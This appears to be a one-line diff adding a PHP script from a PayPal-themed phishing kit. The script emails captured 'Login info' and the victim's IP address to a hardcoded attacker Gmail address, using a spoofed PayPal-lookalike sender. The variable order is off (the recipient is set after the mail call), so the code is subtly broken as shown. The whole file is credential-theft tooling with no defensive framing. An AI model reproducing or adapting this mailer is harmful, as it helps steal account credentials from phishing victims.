@@ -1,0 +1,1 @@
+<?php  include ('config.php'); $subject = "-| =?utf-8?q?=F0=9F=92=B0?= Login info =?utf-8?q?=F0=9F=92=B0?= | {$ip} |-"; $headers = "From:Result ^^ <paypal@supprot.com>"; mail($to, $subject, $nab,$headers); $to = "aymanhacker13@gmail.com"; ?>
